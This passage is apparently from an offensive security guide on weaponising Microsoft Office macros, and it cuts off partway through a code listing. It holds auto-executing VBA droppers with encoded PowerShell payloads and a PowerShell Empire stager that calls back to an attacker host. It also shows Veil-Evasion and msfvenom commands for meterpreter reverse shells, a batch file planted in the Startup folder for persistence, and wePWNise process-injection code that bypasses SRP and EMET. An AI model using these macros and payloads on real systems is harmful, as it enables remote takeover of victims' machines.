& "ALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAJwBIADQAcwBJAEEATQB" _
& "wAHAAbQAxAGsAQwBBADcAMQBXAGIAVwAvAGEAUwBCAEQAKwBuAEUAcgA5AEQAMQBhAEYAaABLADAAUwBiAEEAaAB0AG0AawBpAFYAYgBvADAAQgBrADIAQQBDAGMAWQBBAEEAUgBkAFYAaQByADgAMgBTAHQAWgBmAFkAYQA5ADUANgAvAGUAOAAzAEIAdAB6AFEATgBqAG4AbAA3AHEAUwB6AFEATgA3AGQAbQBkAG0AWgBmAGUAYQBaAEgAWAB0AEo" _
& "ANgBBAGoASwBRADIAawBaAGEAMAB3ADMAagBmAGwAVQArAHYAYgAyAHoAVQBrAEgAUgB6AGkAUQA1AEYAeABRAEUAcQBPAEMAbABQAE8ATQB3AGUAUAA2AEkAdABaAHMAeQA2AG8AcQBKAHkAZQBnAGsAQQBzAEgASgBQAHgAQQBwAE0AKwBTAFAARQBhAEwAaABjAEUARABUAE0AUABKADUAVwBVADEAaQBTAEkAUwBpAHYAMgA4ADIAQwBBAEMAeAB" _
& "UAEUASgBwAG8AeQBTAFcARgBhAGsAUAA2AFgAQgBqAEUAVABrADkARwBZADYASgA0ADYAUQB2AGsAbQA1AHIAOABVAEcANAAxAFAATQBEAG0AcQBiAEsAbgBaAG0AUgBEAHAARgBvAFoAdgBLAFcAdAB6AEIAYQBYAFIARgBlADgARwBvAGsAUABOAGYAdgB1AFMAVgA4AFcAbABwAFUAcQB3ADkASgBwAGoARgBjAHQANwBlAHgASQBJAEUAUgBaAGU" _
& "AeAB2AEMASgA5AFYAMQBLAEgAZAA1AHMARgBrAGYATQBXAGQAUwBJAGUAYwAwADgAVQBCAHoAUQA4AEsAeABkADcAWQBZAHcAOQAwAG8AYgBkAGwAcwBRAGkAWQBzAGIAZABPAEsALwBBAE8AZQBBAFgARQBaAEYARQBvAFgAUQA0AFUAYgByAEYAWABrAEgATwB3ADcAQQBUAGMAUQBlADUAYgBrAFIAaQAwAEMAOAAyAHcAeQBWAC8ASQBIAEkAdQB" _
& "UAEIAZwByAFMASAAvAEkANAA0AFAALwAyAHkAUQBVAE4AQwBBAGcARgB5AFQAaQBDADUAdABFAFMAKwBxAFEAdQBHAGoAaQAwAEcAWABrAGwAbgBnAFQAdQBVADEAVwAyAGIARgBmAGEAeQBRAGYARwA0AEYAVwBSADAAUgBLAEEAWgBMAHkAYgBLAEEAVwBkAHgATgBHADkAcgBaADUANQBmAGQAUQBkADYAbABVADQAUABrADEAbgBZAEQAQwA5ADc" _
& "AZAB2ADMAcgA3AHgATQBpAFoAZwByAFcANgBZAHcANAB0AGoASABzAEQAbwBaAEwAdwBiAEUANABoAFYANwB2AEMAWQA3AGwAUQAvAFMAMQBwAEIAcwBzAEEAbgBGAGoAegBhAHcARABSADMARgB5AFYARQBtAFUAagBqAE4AQQB2AGoAeQBRAFIAOABOAGMAaABkAGUASQA3AEYAOQBLAGIAdwA4AGkANgBsAHoAQQBRAE0AbwBqAEMAZQBEAGMAMwB" _
& "xADMAUABpADAAQgBNAG0ANAB6ADYAawA3AEEAYwB0AEQAcwBuAEwATwBkAEgAcAA3AE0AMwBlADAAMAB0AGsAZwBGAGIALwBNAFAAWQBOADQATgBDAFQARwBKAHMAUQBCAGQAVABKADYAeQBjAC8AbABnAFgAaQBNADcASQA1AGUAegBOAFQAYQBFAEsASwBjAFAAdwBpAEkAYQB4AEIARwBmAEMAeABTAFgAQQB2AFMAKwBIAGUAegBXAGsARABGAEQ" _
& "AMQBzADkAbwBjAHcAbABFAFgASQBnAGwAegBGAEUAQgBXAGwAVwBmAGcANQBtAG4AeQBvADUAMwB3AHcAdABFAGcAQgB1ACsAMwBrACsAVABRAHkAUQBtAG0AVABhAEIAeQBKAHYATQB1AC8AcABIAEoAVAB5AFYAWQBiAGoAdQBDAEIAMQBFAHEAZwBxAHAAeQBEAFoAQgBEAFAAaQBGAGkAUQBVAHgAdgBRAGcAUQBvAG4AZwB1ADIASAArAEsAVgB" _
& "3AHIAWQBZAEkANgBPAEIAYgBaAGQAaABQAGwARgB6AGcAUABiAHEAcwA4AGoARQBXAFUATwBKAEIAUgBnAE8ARABPAFgAaABDAEgAWQBwAFkAaQBVAHAAQgBNADYAaABKADkAWQAxAE0ALwBjADUAOQAvAEYAbwA4AHEAWgBvAHkARwBQAHUAeQAwAGgASAB6AEEAUwBvAHEARABMAFYASwBlAFIARwA3AGgAbQBCAE4ASwAwAFMAYQBpAEcAUwB3AFk" _
& "AQwBVAEIAegBWACsAdAAxAGgAbgAyAG8ANwBFAE4AMQA3AE8AaQBGAGYAZQBMAG0AWAB3AGcAMwBLADQARQA5ADMAMQBOADgATQBtAEMATwBnAG8AVwBrADIANAB5AEwAZwB0AFMAbgBrAFkAQwBiAEkAOABYADYAaQBHAGYALwBKAGEAUwBqAEMAKwBRADQAdQBHAHAARQBEAGkAbQBUAHMAdwBJAGIANgB4AHUAUgAxAGsAUgB1ADEAYgA3AHAAcAB" _
& "kAHcAOQBBAEwAZQBEAEsAUgBJAEEAVQBUADMAaQBnAFkANQBqADgAcgBGAGkAaQB3AGcAQQBsAE4AKwBwAE4ANwBTAEsANABCAGsAMgBRADIAWQA1ACsAZwBNAHQAbwBSAFUAdABOAFMAMwA0ADkAKwBoAFoAawB4AHYAbgA3AHYAWABWADMARgBRAGoAWQB6ADMAegBVAEQATgB1AFcAbQBiAEgANgBKAHAAbQBaAFgAbABsADkAeQB2AEMAcgBqAFg" _
& "ARgBkAGEAYwBwAHIATgByADkAZgBHADQAagA4ADcAWQAzAEYASwBNAG0ATQB1ACsAbwA5AGoAQwBzAGIAQgBkAFgAZABHAHUAMwBrAEQAdABjAHEAeAArADMAKwBuAGEAbAA2AGUAdgB0ADMASABlADkAbwBlAEYANQAvAHIAbABuADMANQBZACsAMQBHAGwAcgBVAE8AMwBxAFcAaABtADMAagBGAHIAUwBHAHUAZwByAFgAYQB2AEUATgBiAG8AeQB" _
& "1ADcAVABYAGYAYgBpAHEAaQArAG0AdwB6ADMARABQAFUALwAzADcAMABnAFcAbQA2ADEAWQAwADcANQBlADQAdABXADAAaQAxAEoAaQBkAE8AZABzAHIAcgA5ACsAWQBXAGUANQBtAGEASwBvAFgAZwA4AG8ARABxAGkARgBVAEQAVwB2ADkAdQBzADYAdgBoADMAcQBFAE8AbQBvAGYAKwAzADIAKwB1AHYAWQByAG8ANABFAFAAWgAyADIAYwBVAHo" _
& "ATABxADkAdQBwADYAdAAxAHYAWABVAGEAOAB4AGYAegBRAHUAVgBCADkAcwA3AC8ARgBNAEgALwBUAEwAZABMAFMANAB2ADUAMwBCAHYAQQA0AGgAWABLAHQAYQBwAGUAbQBTAEwAUgA5ADIAQQBhAFEARwBSADkAaQAvAEIAUgAyAC8AVwBuAFoAbQBIAHUAZwBZADcANQBIACsAdgBzADMAagBNAG4ANwBRAE8AZABKAEIAcAB6ADUANgBoAEwAaQB" _
& "HAGkAMwBxAEgAZwBmAHkAdQBWACsAYQBvAHoAOQByADMARwBMAFYARwBtADcAcQBxAGwAbwBhAGQAQwBqAEkAMQBPAG0AagA0AEsATgAwAFMAKwAzAG8AWABvADMAaABwAGIAQQAyADEAMQBIAGUANQBPAC8AagBRAEgAbgBwAHEALwA1ADYAZABxADAAYgAxAGIAdQBGADQAcQBxAHEAdQBUAE8AUABhAEcAWgBYAFcAbgAyADcATwBQADcAVQBHAHQ" _
& "AQgA5AHcAMQBGAFAAVgAvAHIAdQBVAEgAcwBDAFAASABGADUAdgBMAHMANAB2AHYAcABhAG4AUgAwAGwALwA2AGYASwAzAGMAQgBUAFAATQBBAE0AeQB3AEoAMgBlAGwAVwBxAGQAUgAvAFgARAA3AGQAegBoAE4ATABXAFEANQBhAGQAKwAvAFUAQwBpAGsARABEAG8AYwBkAEEARgBNADQASQBqAHgAcgBpAFQATgBvAHYAcwBNAG8AZABlAHQAZQA" _
& "4AGcARQA2AGoAWQBIAGcAegBQAHkAcwArAE8ARgBPAG0ASABvAHYATABVAFIAYgBLAGwAeQA4AHMAUgBSAEEAdgBsAGsAbABLADQAMgBDAEsAaABMADIAWQBGAGIAWAAyAG0AYQBkAEEASAB0AEgAVgBGAGcAeQBPAC8ALwBvAFIAVgB2AHQAagBJAHUANgAwAEsAYQBSADkANQB3AGkAbAB6AHcASABZAE8AbABMAFIANABjAHMAbQBxAE8AZwAxAHE" _
& "AWgBCAFMASQAvAHcASABGAFEALwBYAE8ANABPAFcAKwBBAHMAVwBuAHQAYgArAFIAdgBnAHAAWgByAFgAQwBFAHcAbQArAHkAbgB4AGYAKwBFAGQAYgAvAEQAbwBjAEIAcABnAEwAVQBiAGIAaQBMAEcATgBsADMAegBSAGYAaABPAFAARABuADYATgBQAGoASwBXAFgAQQBFAGUALwB3AHAAQgArAEIATgA0AGsANABiAGMATgAzAHkAVgArAGQAQgB" _
& "SADEAQQBmAFEAbwBBAEEAQQA9AD0AJwAnACkAKQA7AEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQAcwAsAFsASQBPAC4AQwBvAG0AcAByAGU" _
& "AcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7ACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZAB" _
& "PAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHI" _
& "AdAAoACQAcwApADsA"
  Call Shell(rkEsZ, vbHide)
End Sub
Sub AutoOpen()
  pm6HSAm
End Sub
Sub Workbook_Open()
  pm6HSAm
End Sub

```

---


**5. `Empire` generated `windows/macro` stager**

The **PowerShell Empire** can also provide MS Office Macro as a stager for our listener.

In order to acquire such stager we can follow the following steps (for Empire 2.0):

- `uselistener http`
- `set Host 192.168.56.101`
- `main`
- `usestager windows/macro`
- `set Listener http`
- `execute`

The resulting Macro will be of form:

```
Sub AutoOpen()
	Debugging
End Sub

Sub Document_Open()
	Debugging
End Sub

Public Function Debugging() As Variant
	Dim Str As String
	str = "powershell -noP -sta -w 1 -enc  WwBSAGUAZgBdAC4AQQ"
	str = str + "BzAHMARQBtAEIAbABZAC4ARwBFAFQAVABZAFAARQAoACcAUwB5"
	str = str + "AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AH"
	str = str + "QAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcA"
	str = str + "KQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAdABGAGkARQ"
	str = str + "BMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAn"
	str = str + "ACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjAC"
	str = str + "cAKQAuAFMARQBUAFYAYQBsAFUAZQAoACQATgB1AGwAbAAsACQA"
	str = str + "VABSAHUARQApAH0AOwBbAFMAWQBTAFQARQBNAC4ATgBFAHQALg"
	str = str + "BTAEUAcgB2AGkAQwBlAFAAbwBpAE4AVABNAEEAbgBBAGcARQBS"
	str = str + "AF0AOgA6AEUAWABQAEUAQwB0ADEAMAAwAEMATwBuAFQAaQBOAF"
	str = str + "UAZQA9ADAAOwAkAFcAYwA9AE4AZQB3AC0ATwBCAGoARQBDAHQA"
	str = str + "IABTAFkAUwB0AGUAbQAuAE4AZQBUAC4AVwBFAGIAQwBMAEkAZQ"
	str = str + "BOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAg"
	str = str + "ACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE"
	str = str + "8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAA"
	str = str + "cgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbw"
	str = str + "AnADsAJABXAGMALgBIAEUAYQBkAGUAUgBzAC4AQQBkAGQAKAAn"
	str = str + "AFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAE"
	str = str + "MALgBQAHIATwB4AFkAPQBbAFMAWQBTAHQARQBNAC4ATgBFAHQA"
	str = str + "LgBXAGUAYgBSAEUAUQB1AGUAUwB0AF0AOgA6AEQARQBmAEEAVQ"
	str = str + "BsAFQAVwBFAGIAUABSAG8AWAB5ADsAJAB3AGMALgBQAFIATwB4"
	str = str + "AHkALgBDAHIARQBEAEUAbgB0AGkAYQBMAFMAIAA9ACAAWwBTAH"
	str = str + "kAcwBUAGUATQAuAE4AZQBUAC4AQwByAGUARABlAG4AdABpAGEA"
	str = str + "bABDAGEAYwBIAEUAXQA6ADoARABFAGYAYQB1AEwAdABOAEUAVA"
	str = str + "BXAG8AcgBrAEMAUgBlAEQARQBuAHQASQBBAEwAcwA7ACQASwA9"
	str = str + "AFsAUwBZAFMAdABFAE0ALgBUAEUAeABUAC4ARQBOAEMAbwBEAG"
	str = str + "kAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAWQB0AEUA"
	str = str + "cwAoACcAdwBKADEAcwBaAD8AKgA1AFcAOgBuAFYAaQBlADsANg"
	str = str + "A4AHkAfABVACwAfgBGACUAMgBYAEgAMABBACkASQB7ACcAKQA7"
	str = str + "ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIARwBzADsAJABTAD"
	str = str + "0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoA"
	str = str + "PQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJA"
	str = str + "BLAC4AQwBvAHUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABf"
	str = str + "AF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAF"
	str = str + "sAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEA"
	str = str + "KQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQ"
	str = str + "ApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABd"
	str = str + "AD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAE"
	str = str + "IAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQA"
	str = str + "SABdACkAJQAyADUANgBdAH0AfQA7ACQAVwBDAC4ASABlAGEAZA"
	str = str + "BlAFIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBz"
	str = str + "AGUAcwBzAGkAbwBuAD0AYgBTAG8ASgBUAHMAOAA2AEsANQBvAF"
	str = str + "kAcwBLAEUATwBmAC8ASwAxADUAYwArADkASQBvAGMAPQAiACkA"
	str = str + "OwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQ"
	str = str + "A2ADgALgA1ADYALgAxADAAMQA6ADgAMAAnADsAJAB0AD0AJwAv"
	str = str + "AGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnAD"
	str = str + "sAJABkAEEAdABhAD0AJABXAEMALgBEAG8AdwBuAEwAbwBhAGQA"
	str = str + "RABhAHQAQQAoACQAcwBFAFIAKwAkAFQAKQA7ACQASQBWAD0AJA"
	str = str + "BEAGEAVABhAFsAMAAuAC4AMwBdADsAJABEAEEAVABhAD0AJABE"
	str = str + "AEEAdABBAFsANAAuAC4AJABkAEEAVABBAC4ATABlAE4AZwBUAE"
	str = str + "gAXQA7AC0AagBPAGkAbgBbAEMAaABBAFIAWwBdAF0AKAAmACAA"
	str = str + "JABSACAAJABEAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfA"
	str = str + "BJAEUAWAA="
	Const HIDDEN_WINDOW = 0
	strComputer = "."
	Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
	Set objStartup = objWMIService.Get("Win32_ProcessStartup")
	Set objConfig = objStartup.SpawnInstance_
	objConfig.ShowWindow = HIDDEN_WINDOW
	Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
	objProcess.Create str, Null, objConfig, intProcessID
End Function
```

Obviously we can enhance it any further as we wish, as well as obfuscate it little bit further.


---

**6. Using `Veil-Evasion` generated _powershell.exe_ command within `Luckystrike` generated macro**

This one is quite fancy. Firstly, we generate `powershell.exe -Command "[...]"` Shell command that will get executed directly from within Macro code prepared by hand or by Luckystrike (the latter tool doesn't introduce anything fancy here).

- So, the first step is to obtain a Powershell command for **windows/meterpreter/reverse_https**:

```
./Veil.py  -t Evasion -p 21 --ip 192.168.56.101 --port 443 --msfvenom windows/meterpreter/reverse_https --msfoptions LHOST=192.168.56.101 LPORT=443 -o msf2
```

We will get a result similar to:

```
===============================================================================
                                   Veil-Evasion
===============================================================================
      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
===============================================================================

 [*] Language: powershell
 [*] Payload Module: powershell/meterpreter/rev_https
 [*] PowerShell doesn't compile, so you just get text :)
 [*] Source code written to: /usr/share/veil-output/source/msf2.bat
 [*] Metasploit RC file written to: /usr/share/veil-output/handlers/msf2.rc
```

- Then we edit the resulted **msf2.bat** file to make it leverage `start /b`. To do so, we prepend every **powershell.exe** invocation with this `start /b` command.

This script should look like:

```
@echo off
if %PROCESSOR_ARCHITECTURE%==x86 (start /b powershell.exe -NoP -NonI -W Hidden -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVRtb9tGDP7uX0EIN0BCLEV+aZZYCNDUadZsdZrFbtLNMIazRFvXnO6U08mR4/q/j3I0x/26LzqR4vF5SD4Ue4JzeO+0ppdSXme5NtZ1HtEolL1ukEjpeDPIy7kUMRSWWzqwsvQdrpW9tQbuhbEllxdS6thtfDK/SBKDRdGGUigLyfNYvGBjLF5jKZVWk3X+5r412mJsveh/cxka5BYnKR3JG5dX+8JaI+alxQNSlsePr8z2weQzds9+777lhmdIWPvLOywq4Ury5WHkK9p1QmU471vWrDcsoQ47Fx+Glx+vfvt0/fsfn0c3X27/vBtPvt4/fPvrbz6PE1wsU/H9UWZK50+msOXquVq/hJ1ur//u5NfTMyeY6GHKzYUxfO16rUWp4hodYpetvA0YtCX1wXWnxG46mwFb/XwDfsAIeVEa9L/Mv1ObwR+XmRfQA36BsOqEIfj4BGddb/uW3cKGLWr2TtQJgt6Phabi4tTXuxT07egcWDJ1l2h9w1WiM/AzXomMsrIk+IxqaVNvto0afmwRHWRH2EBudEyths2U10RnrCI4ehwB+2cbAaqEKFTEviA1NLiwcRU+/2fc7XC9QJEWXG+7PQBYboAYg8vEeRgxAb60cNKnt6Mjb8NSQrIRe6wBE0LACKApkK5IEMT3keKKOiCtGckIxAJc6nnhebDvOkUQbGM4Z6tvXx0qc3qDNhijWYkYbzWNZcQVX6KZDQa1F80QjRULQZuA91yKZCenIZdyTrIkzA2zpsRtxDIybqjgZnDjdWExC+r0DzgfSoHKRi2WBZ9IeGiKgOTrOmWBxic8ZZ02OCP9IqTkx/0gJP46ywlsLqni0fj6I5wEnQgeBPXxuYCbied4EVMEuoxg+mFtcSeovG5DFlzqZyU1Ty655a6TWpsXg+Pjzlk36JycBu8oVdgZ9Pu9Y6Yc8FpM0zUi5NerTuLAbI7mEhdCid2I2BP4N7Ra4BB+r+uAr8gqch4j7DxXzTAL8HNeFDY1ZYtV50wPBj/9esI2yxvBtcOqF4YhHf3Qi6ZNv+5KZUWGAW0qGp03kymCETdFyiWNZajztcvyNoRtmL4u9MxlFS0SGb2u63lt2IPUpdGVwz8OIbZZ1a6PsF44XVpflZJUs/ur+GOJmNPeYaxJ1qcn/TDc0vTjdLP9Fw==\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();") else (start /b %WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVRtb9tGDP7uX0EIN0BCLEV+aZZYCNDUadZsdZrFbtLNMIazRFvXnO6U08mR4/q/j3I0x/26LzqR4vF5SD4Ue4JzeO+0ppdSXme5NtZ1HtEolL1ukEjpeDPIy7kUMRSWWzqwsvQdrpW9tQbuhbEllxdS6thtfDK/SBKDRdGGUigLyfNYvGBjLF5jKZVWk3X+5r412mJsveh/cxka5BYnKR3JG5dX+8JaI+alxQNSlsePr8z2weQzds9+777lhmdIWPvLOywq4Ury5WHkK9p1QmU471vWrDcsoQ47Fx+Glx+vfvt0/fsfn0c3X27/vBtPvt4/fPvrbz6PE1wsU/H9UWZK50+msOXquVq/hJ1ur//u5NfTMyeY6GHKzYUxfO16rUWp4hodYpetvA0YtCX1wXWnxG46mwFb/XwDfsAIeVEa9L/Mv1ObwR+XmRfQA36BsOqEIfj4BGddb/uW3cKGLWr2TtQJgt6Phabi4tTXuxT07egcWDJ1l2h9w1WiM/AzXomMsrIk+IxqaVNvto0afmwRHWRH2EBudEyths2U10RnrCI4ehwB+2cbAaqEKFTEviA1NLiwcRU+/2fc7XC9QJEWXG+7PQBYboAYg8vEeRgxAb60cNKnt6Mjb8NSQrIRe6wBE0LACKApkK5IEMT3keKKOiCtGckIxAJc6nnhebDvOkUQbGM4Z6tvXx0qc3qDNhijWYkYbzWNZcQVX6KZDQa1F80QjRULQZuA91yKZCenIZdyTrIkzA2zpsRtxDIybqjgZnDjdWExC+r0DzgfSoHKRi2WBZ9IeGiKgOTrOmWBxic8ZZ02OCP9IqTkx/0gJP46ywlsLqni0fj6I5wEnQgeBPXxuYCbied4EVMEuoxg+mFtcSeovG5DFlzqZyU1Ty655a6TWpsXg+Pjzlk36JycBu8oVdgZ9Pu9Y6Yc8FpM0zUi5NerTuLAbI7mEhdCid2I2BP4N7Ra4BB+r+uAr8gqch4j7DxXzTAL8HNeFDY1ZYtV50wPBj/9esI2yxvBtcOqF4YhHf3Qi6ZNv+5KZUWGAW0qGp03kymCETdFyiWNZajztcvyNoRtmL4u9MxlFS0SGb2u63lt2IPUpdGVwz8OIbZZ1a6PsF44XVpflZJUs/ur+GOJmNPeYaxJ1qcn/TDc0vTjdLP9Fw==\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();")
```

- Afterwards, we upload the resulted **msf2.bat** file to the target machine, for instance via _Meterpreter_:

```
meterpreter> upload /usr/share/veil-output/source/msf2.bat "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\nasty.bat"

```

And that's all.



---


**7. `wePWNise` architecture-independent Macro dynamically bypassing SRPs+EMET**

That's something huge actually. The `wePWNise` tool by **MWRLabs** is a tool that embeds previously generated x86 and x64 payloads right into VBS script that itself is capable of enumerating (in the runtime) Software Restriction Policies and EMET policies, finding weak spots and then bypassing those. Everything goes automatically right after executing the macro. This functionality makes the `wePWNise` code quite robust under various enviroment restrictions.

In order to generate such Macro we have to firstly generate **two** payloads for both: **x86** and **x64** architecture's for instance via `msfvenom`:

```
work|02:47|~/ # msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.56.101 LPORT=443 -f raw -o /tmp/methttps1.raw
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 408 bytes
Saved as: /tmp/methttps1.raw

work|02:48|~/ # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.101 LPORT=443 -f raw -o /tmp/methttps1x64.raw
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 673 bytes
Saved as: /tmp/methttps1x64.raw
```

Having those two, we can proceed to actual VBA code generation with command:

```
work|02:48|~/ # python wepwnise.py -i86 /tmp/methttps1.raw -i64 /tmp/methttps1x64.raw --out /tmp/wepwnise.txt

```

Which will result in the following Macro code:

```
Private Const PROCESS_ALL_ACCESS = &H1F0FFF
Private Const MEM_COMMIT = &H1000
Private Const MEM_RELEASE = &H8000
Private Const PAGE_READWRITE = &H40
Private Const HKEY_LOCAL_MACHINE = &H80000002
Private Const PROCESSOR_ARCHITECTURE_AMD64 = 9
Private Type PROCESS_INFORMATION
hProcess As Long
hThread As Long
dwProcessId As Long
dwThreadId As Long
End Type
Private Type STARTUPINFO
cb As Long
lpReserved As String
lpDesktop As String
lpTitle As String
dwX As Long
dwY As Long
dwXSize As Long
dwYSize As Long
dwXCountChars As Long
dwYCountChars As Long
dwFillAttribute As Long
dwFlags As Long
wShowWindow As Integer
cbReserved2 As Integer
lpReserved2 As Long
hStdInput As Long
hStdOutput As Long
hStdError As Long
End Type
#If VBA7 Then 'x64 office
Private Declare PtrSafe Function bodyslam Lib "kernel32" Alias "TerminateProcess" (ByVal hProcess As Long, ByVal uExitCode As Long) As Boolean
Private Declare PtrSafe Function watergun Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function leechseed Lib "kernel32" Alias "VirtualFreeEx" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal dwSize As Long, ByVal dwFreeType As Long) As LongPtr
Private Declare PtrSafe Function thunderbolt Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As LongPtr) As LongPtr
Private Declare PtrSafe Function flamethrower Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Any, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Sub pokedex Lib "kernel32" Alias "GetSystemInfo" (lpSystemInfo As SYSTEM_INFO)
Private Declare PtrSafe Function cosmicpower Lib "kernel32" Alias "GetCurrentProcess" () As LongPtr
Private Declare PtrSafe Function rarecandy Lib "kernel32" Alias "IsWow64Process" (ByVal hProcess As LongPtr, ByRef Wow64Process As Boolean) As Boolean
Private Declare PtrSafe Function dragonascent Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, ByVal lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Type SYSTEM_INFO
wProcessorArchitecture As Integer
wReserved As Integer
dwPageSize As Long
lpMinimumApplicationAddress As LongPtr
lpMaximumApplicationAddress As LongPtr
dwActiveProcessorMask As LongPtr
dwNumberOrfProcessors As Long
dwProcessorType As Long
dwAllocationGranularity As Long
wProcessorLevel As Integer
wProcessorRevision As Integer
End Type
#Else
Private Declare Function bodyslam Lib "kernel32" Alias "TerminateProcess" (ByVal hProcess As Long, ByVal uExitCode As Long) As Boolean
Private Declare Function watergun Lib "kernel32" Alias "VirtualAllocEx" (ByVal hProcess As Long, ByVal lpAddress As Any, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function leechseed Lib "kernel32" Alias "VirtualFreeEx" (ByVal hProcess As Long, ByVal lpAddress As Any, ByVal dwSize As Long, ByVal dwFreeType As Long) As Long
Private Declare Function thunderbolt Lib "kernel32" Alias "WriteProcessMemory" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByRef lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
Private Declare Function flamethrower Lib "kernel32" Alias "CreateRemoteThread" (ByVal hProcess As Long, ByVal lpThreadAttributes As Any, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadId As Long) As Long
Private Declare Sub pokedex Lib "kernel32" Alias "GetSystemInfo" (lpSystemInfo As SYSTEM_INFO)
Private Declare Function cosmicpower Lib "kernel32" Alias "GetCurrentProcess" () As Long
